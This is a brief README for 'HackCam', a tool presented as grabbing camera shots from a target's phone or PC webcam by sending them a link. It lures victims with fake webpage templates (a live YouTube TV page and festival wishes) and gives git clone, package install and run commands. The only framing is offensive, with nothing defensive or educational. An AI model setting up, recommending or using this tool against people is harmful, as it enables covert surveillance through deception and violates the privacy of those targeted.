# HackCam
Grab cam shots from target's phone front camera or PC webcam just sending a link.HackCam
# Features
In this tool I added two automatic webpage templates for engaged target on webpage to get more picture of cam
Live Youtube Tv And Festival Wishing
## Installing (All Linux OS Using This Tool):-

```
git clone https://github.com/hackerboysanat/HackCam
cd HackCam
apt-get -y install php openssh git wget
chmod +x ./hackcam.sh
./hackcam.sh
```
